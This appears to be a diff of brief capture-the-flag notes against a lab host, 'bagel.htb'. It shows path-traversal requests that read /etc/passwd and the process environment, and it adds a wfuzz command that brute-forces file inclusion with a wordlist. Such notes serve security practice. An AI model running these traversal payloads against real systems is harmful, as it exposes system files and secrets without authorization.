@@ -4,6 +4,8 @@ Burpsuite
 
 GET /?page=../../../../../../etc/passwd
 
+wfuzz -c -w LFI-LFISuite-pathtotest-huge.txt --hw 0 http://bagel.htb:8000/?page=../../../../../../../FUZZ
+
 GET /?page=../../../../../../self/proc/environ
 
 PID:890
